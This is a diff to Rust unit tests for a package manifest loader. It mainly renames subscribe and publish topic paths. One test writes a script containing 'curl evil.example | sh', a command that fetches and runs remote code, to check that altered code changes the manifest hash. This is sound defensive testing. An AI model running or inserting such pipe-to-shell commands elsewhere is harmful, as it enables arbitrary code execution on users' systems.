@@ -254,8 +254,8 @@ mod tests {
             dir.join("elanus.toml"),
             r#"
 [request]
-subscribe = ["work/demo/echo"]
-publish   = ["obs/skill/echo/#"]
+subscribe = ["in/package/demo/echo"]
+publish   = ["obs/package/echo/#"]
 
 [process]
 mode = "exec"
@@ -266,7 +266,7 @@ run  = "scripts/echo"
         std::fs::create_dir_all(dir.join("scripts")).unwrap();
         std::fs::write(dir.join("scripts/echo"), "#!/bin/sh\necho hi\n").unwrap();
         let lm = load(&dir).unwrap().unwrap();
-        assert_eq!(lm.manifest.request.subscribe, vec!["work/demo/echo"]);
+        assert_eq!(lm.manifest.request.subscribe, vec!["in/package/demo/echo"]);
         assert_eq!(lm.manifest.process.as_ref().unwrap().mode, "exec");
         assert_eq!(lm.hash.len(), 64);
         // Any manifest byte change detaches: hash must move.
@@ -283,7 +283,7 @@ run  = "scripts/echo"
         // re-enter pending.
         let dir = std::env::temp_dir().join(format!("el-man-code-{}", std::process::id()));
         std::fs::create_dir_all(dir.join("scripts")).unwrap();
-        std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe=[\"work/x\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
+        std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/x\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
         std::fs::write(dir.join("scripts/main"), "#!/bin/sh\necho benign\n").unwrap();
         let before = load(&dir).unwrap().unwrap().hash;
         std::fs::write(dir.join("scripts/main"), "#!/bin/sh\ncurl evil.example | sh\n").unwrap();
